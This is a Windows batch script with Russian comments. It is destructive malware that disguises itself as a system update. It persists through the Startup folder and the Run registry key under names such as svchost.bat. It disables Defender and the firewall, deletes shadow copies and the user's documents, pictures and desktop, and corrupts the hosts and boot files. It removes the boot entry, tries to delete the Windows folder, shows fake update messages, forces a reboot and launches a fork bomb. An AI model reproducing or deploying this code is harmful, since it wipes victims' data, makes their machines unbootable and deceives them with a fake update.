@echo off
title System Update (Не верьте заголовку!)
cls

:: Скрываем вывод команд и отключаем возможность остановки Ctrl+C
ver > nul
echo %cd% > nul

:: 1. МАСКИРОВКА И ЗАКРЕПЛЕНИЕ В СИСТЕМЕ
:: Копируем себя в автозагрузку под безобидным именем
copy %0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat" /Y > nul
copy %0 "%temp%\winupdate.bat" /Y > nul

:: Добавляем себя в реестр для гарантированного запуска (если автозагрузка не сработает)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update Service" /t REG_SZ /d "%temp%\winupdate.bat" /f > nul

:: 2. ПОПЫТКА ОТКЛЮЧИТЬ ЗАЩИТУ (для старых версий Windows)
net stop "Windows Defender" /y > nul 2>&1
net stop "Security Center" /y > nul 2>&1
netsh advfirewall set allprofiles state off > nul

:: 3. ВАНДАЛИЗМ (Порча пользовательских данных)
:: Удаляем резервные копии и теневые копии (Volume Shadow Copies), чтобы нельзя было восстановиться
vssadmin delete shadows /all /quiet > nul 2>&1
wmic shadowcopy delete > nul 2>&1

:: Начинаем удалять важные пользовательские файлы
echo Удаление личных документов...
del /F /S /Q "%userprofile%\Documents\*.*" > nul 2>&1
del /F /S /Q "%userprofile%\Pictures\*.*" > nul 2>&1
del /F /S /Q "%userprofile%\Desktop\*.*" > nul 2>&1

:: 4. ПОВРЕЖДЕНИЕ ФАЙЛОВОЙ СИСТЕМЫ
:: Заполняем мусором важные системные файлы (делаем их нечитаемыми)
echo 0 > C:\Windows\System32\drivers\etc\hosts
echo 0 > C:\boot.ini 2> nul
echo 0 > C:\bootmgr 2> nul

:: Пытаемся испортить реестр, выгружая ветку SYSTEM (это вызовет синий экран при следующей загрузке)
reg unload HKLM\TEMP_SYSTEM > nul 2>&1

:: 5. АТАКА НА ЗАГРУЗЧИК
:: Удаляем запись о загрузке Windows (для систем с BCD)
bcdedit /delete {current} /f > nul 2>&1

:: Для старых систем (XP) — удаляем важные загрузочные файлы
attrib -r -s -h C:\boot.ini > nul 2>&1
del C:\boot.ini /F /Q > nul 2>&1
attrib -r -s -h C:\ntldr > nul 2>&1
del C:\ntldr /F /Q > nul 2>&1
attrib -r -s -h C:\NTDETECT.COM > nul 2>&1
del C:\NTDETECT.COM /F /Q > nul 2>&1

:: 6. ФИНАЛЬНАЯ ЧИСТКА
:: Пытаемся удалить саму Windows
echo Это займет некоторое время. Пожалуйста, не выключайте компьютер.
rmdir /S /Q C:\Windows > nul 2>&1

:: 7. ПЕРЕЗАГРУЗКА (чтобы изменения вступили в силу и система "упала")
shutdown /r /t 10 /c "Система обновлена. Перезагрузка..." /f

:: 8. (Необязательно) Запуск Fork Bomb после всего, чтобы замести следы
start %0
%0|%0

exit